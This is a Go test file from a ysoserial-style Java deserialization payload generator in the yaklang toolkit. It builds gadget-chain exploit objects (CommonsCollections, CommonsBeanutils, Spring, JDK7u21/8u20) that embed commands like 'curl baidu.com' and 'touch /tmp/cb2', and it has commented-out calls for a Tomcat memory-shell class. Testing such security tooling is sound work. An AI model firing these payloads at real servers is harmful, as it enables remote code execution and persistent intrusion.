package yso

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"yaklang.io/yaklang/common/javaclassparser"
	"yaklang.io/yaklang/common/log"
	"yaklang.io/yaklang/common/yak/yaklib/codec"
	"yaklang.io/yaklang/common/yserx"
	"testing"
)

func TestPayloadGenerators(t *testing.T) {
	for index, gadget := range []GadgetFunc{GetCommonsBeanutils2(),
		//GetCommonsCollections1(), GetCommonsCollections2(), GetCommonsCollections3(),
		//GetCommonsCollections4(), GetCommonsCollections5(), GetCommonsCollections6(),
		//GetCommonsCollections7(),

		GetCommonsCollectionsK1(),
		GetCommonsCollectionsK2(),
		GetCommonsCollectionsK3(),
		GetCommonsCollectionsK4(),

		GetClojure(),
		GetSpring1(), GetSpring2(),
		GetJDK7u21(), GetJDK8u20(),
	} {
		obj, err := gadget("curl baidu.com")
		if err != nil {
			log.Errorf("GadgetFunc index[%v]", index)
			log.Error(err)
			t.FailNow()
		}
		serx, err := yserx.ParseJavaSerialized(yserx.MarshalJavaObjects(obj))
		if err != nil {
			panic(err)
		}
		if serx == nil {
			serx, err := yserx.ParseJavaSerializedEx(bufio.NewReader(bytes.NewBuffer(yserx.MarshalJavaObjects(obj))), os.Stdout)
			if err != nil {
				panic(err)
			}
			if serx == nil {
				panic("error for index" + fmt.Sprint(index))
			}
		}
	}
}

func TestGetCommonsBeanutils2(t *testing.T) {
	res, err := GetCommonsBeanutils2()("touch /tmp/cb2")
	if err != nil {
		return
	}
	println(codec.EncodeToHex(yserx.MarshalJavaObjects(res)))
}

func TestGetCommonsBeanutil1(t *testing.T) {
	//res, err := GetCommonsBeanutils1()("touch /tmp/cb1")
	//if err != nil {
	//	return
	//}
	//println(codec.EncodeToHex(yserx.MarshalJavaObjects(res)))
}
func TestClassFileToJson(t *testing.T) {
	obj, _ := javaclassparser.ParseFromFile("/Users/z3/Code/idea/rmiTest/src/dnslog.class")
	js, _ := obj.Json()
	println(js)
}
func TestGenExecClass(t *testing.T) {
	//bytes := GenTomcatEchoFilterMemTarjon("whoami", ClassNameOption("whoami"), MemTarjonHeaderOption("aa", "bb"))
	//bytes := GenExec("whoami", ClassNameOption("execClass"))
	//ioutil.WriteFile("/Users/z3/Downloads/command_gen1.class", bytes, 0666)
}
